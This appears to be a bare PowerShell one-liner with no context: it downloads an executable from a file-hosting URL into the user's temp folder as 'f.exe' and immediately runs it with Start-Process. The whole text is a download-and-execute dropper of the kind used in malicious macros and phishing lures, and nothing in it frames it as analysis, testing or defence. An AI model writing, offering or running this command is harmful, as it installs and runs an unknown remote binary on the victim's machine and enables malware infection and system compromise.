
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/bvudaf.exe', $dpl);Start-Process $dpl

